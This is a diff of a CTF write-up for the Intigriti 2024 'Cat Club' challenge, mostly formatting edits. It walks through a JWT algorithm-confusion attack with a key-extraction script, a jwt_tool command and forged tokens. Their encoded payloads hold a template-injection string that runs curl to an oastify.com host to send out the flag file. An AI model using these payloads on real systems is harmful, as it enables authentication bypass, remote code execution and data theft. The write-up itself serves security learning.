@@ -381,15 +381,14 @@ router.get("/jwks.json", async (req, res) => {
 ```
 ![Cat Club JWK](/assets/img/Intigriti-ctf_2024/cat_club_jwk.png)
 
-#### Let's exploit <br>
-- First, let's create a script to extract and format the public key from the JWKS endpoint:
-```python
+#### Let's exploit
+- First, let's create a script to extract and format the public key from the JWKS endpoint: <br>
+```py
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
 import base64
 import json
 
-# Get the JWKS data from /jwks.json endpoint
 jwks = {
     "keys": [{
         "kty": "RSA",
@@ -400,21 +399,17 @@ jwks = {
     }]
 }
 
-# Extract key components
 key_data = jwks["keys"][0]
 n = int.from_bytes(base64.urlsafe_b64decode(key_data["n"] + "=="), byteorder="big")
 e = int.from_bytes(base64.urlsafe_b64decode(key_data["e"] + "=="), byteorder="big")
 
-# Create RSA public key
 public_key = rsa.RSAPublicNumbers(e, n).public_key()
 
-# Convert to PEM format
 pem_public_key = public_key.public_bytes(
     encoding=serialization.Encoding.PEM,
     format=serialization.PublicFormat.SubjectPublicKeyInfo
 )
 
-# Save the public key
 with open("public_key.pem", "wb") as f:
     f.write(pem_public_key)
 ```
@@ -422,7 +417,7 @@ with open("public_key.pem", "wb") as f:
 But the JWT is using `RS256` alg so we need to change to `HS256` and then inject payload into username. <br>
 ![Cat Club SSTI](/assets/img/Intigriti-ctf_2024/cat_club_ssti.png)
 
-- Then use jwt_tool to create a malicious token with algorithm confusion:
+- Then use jwt_tool to create a malicious token with algorithm confusion: <br>
 ```bash
 python3 jwt_tool.py --exploit k -pk public_key.pem "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7ZnVuY3Rpb24oKXtsb2NhbExvYWQ9Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDtzaD1sb2NhbExvYWQoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIHZoZzk4bWxlN21rcTQwZ3lvNHM3MzExZjI2OHh3cmtnLm9hc3RpZnkuY29tYGNhdCAvZmxhZypgJyl9KCl9In0.L8Z5MJNc5VTuBu9w5IFLnE6Slt5H5pJDCd_0xAgstz8"
 ```
@@ -431,7 +426,7 @@ python3 jwt_tool.py --exploit k -pk public_key.pem "eyJ0eXAiOiJKV1QiLCJhbGciOiJI
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7ZnVuY3Rpb24oKXtsb2NhbExvYWQ9Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDtzaD1sb2NhbExvYWQoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIDllb241MGlzNDBoNDFlZGNsaXBsMGZ5dHprNWJ0Nmh2Lm9hc3RpZnkuY29tL2BjYXQgL2ZsYWcqYCcpfSgpfSJ9.7UG2A-miTBExSXBWoIh1TPsJdkOIUV5pEoBCZCqIm5U
 ```
 
-Check the burp collaborator and we got the flag.
+Check the burp collaborator and we got the flag. <br>
 ![Cat Club Flag](/assets/img/Intigriti-ctf_2024/cat_club_flag.png)
 
 **Flag:** `INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}`
